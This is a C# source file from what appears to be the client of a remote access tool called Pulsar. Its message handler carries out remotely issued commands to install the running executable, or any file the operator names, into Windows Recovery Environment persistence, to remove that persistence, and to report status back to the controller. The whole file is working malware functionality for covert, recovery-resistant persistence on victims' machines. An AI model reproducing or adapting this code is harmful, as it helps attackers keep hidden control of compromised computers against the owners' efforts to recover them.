using Pulsar.Client.Helper.WinRE;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.ClientManagement.WinRE;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Pulsar.Client.Messages
{
    public class WinREPersistenceHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoAddWinREPersistence || message is DoRemoveWinREPersistence || message is AddCustomFileWinRE;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoAddWinREPersistence msg:
                    Execute(sender, msg);
                    break;

                case DoRemoveWinREPersistence msg:
                    Execute(sender, msg);
                    break;

                case AddCustomFileWinRE msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoAddWinREPersistence message)
        {
            try
            {
                string exeLocation;

                try
                {
                    exeLocation = Assembly.GetExecutingAssembly().Location;

                    if (string.IsNullOrEmpty(exeLocation))
                    {
                        // we running in memory
                        return;
                    }
                }
                catch (Exception ex)
                {
                    // ye we def in memory
                    Debug.WriteLine($"Failed to get assembly location: {ex.Message}");
                    return;
                }

                byte[] bytes = System.IO.File.ReadAllBytes(exeLocation);
                WinREPersistence.Uninstall();
                WinREPersistence.InstallFile(bytes, ".exe");

                client.Send(new SetStatus
                {
                    Message = "Added WinRE Persistence"
                });
            }
            catch
            {
                client.Send(new SetStatus
                {
                    Message = "Failed to add WinRE Persistence"
                });
            }
        }

        private void Execute(ISender client, DoRemoveWinREPersistence message)
        {
            try
            {
                WinREPersistence.Uninstall();
                client.Send(new SetStatus
                {
                    Message = "Removed WinRE Persistence"
                });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus
                {
                    Message = $"Failed to remove WinRE Persistence: {ex.Message}"
                });
            }
        }

        private void Execute(ISender client, AddCustomFileWinRE message)
        {
            try
            {
                if (string.IsNullOrEmpty(message.Path))
                {
                    client.Send(new SetStatus
                    {
                        Message = "Invalid path or arguments for custom file."
                    });
                    return;
                }

                if (!File.Exists(message.Path))
                {
                    client.Send(new SetStatus
                    {
                        Message = "Custom file does not exist."
                    });
                    return;
                }

                byte[] fileBytes = File.ReadAllBytes(message.Path);

                WinREPersistence.Uninstall();

                string fileExtension = Path.GetExtension(message.Path);

                WinREPersistence.InstallFile(fileBytes, fileExtension);
                client.Send(new SetStatus
                {
                    Message = "Added Custom File to WinRE Persistence"
                });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus
                {
                    Message = $"Failed to add custom file: {ex.Message}"
                });
            }
        }
    }
}